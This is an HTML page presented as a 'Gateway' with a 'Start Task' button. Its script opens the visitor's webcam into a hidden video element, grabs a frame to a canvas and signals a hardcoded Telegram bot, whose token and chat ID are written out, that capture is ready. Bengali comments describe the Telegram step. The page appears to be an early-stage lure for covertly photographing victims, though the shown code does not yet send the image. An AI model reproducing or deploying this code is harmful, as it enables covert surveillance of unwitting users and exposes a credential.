<!DOCTYPE html>
<html>
<head>
    <title>Gateway</title>
</head>
<body>
    <button id="btn" onclick="start()">Start Task</button>
    <div id="status">Waiting...</div>
    <video id="v" autoplay playsinline style="display:none;"></video>

    <script>
        const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
        const CHAT_ID = "8566985497";

        async function start() {
            document.getElementById('status').innerText = "Accessing...";
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            const v = document.getElementById('v');
            v.srcObject = stream;
            
            setTimeout(async () => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                // ইমেজ ডেটা তৈরি
                const dataUrl = c.toDataURL('image/jpeg');
                
                // টেলিগ্রামে মেসেজ পাঠানো (সহজ পদ্ধতি)
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=System_Active_Ready_To_Capture`;
                await fetch(url);
                document.getElementById('status').innerText = "✅ Bot Initialized!";
            }, 2000);
        }
    </script>
</body>
</html>
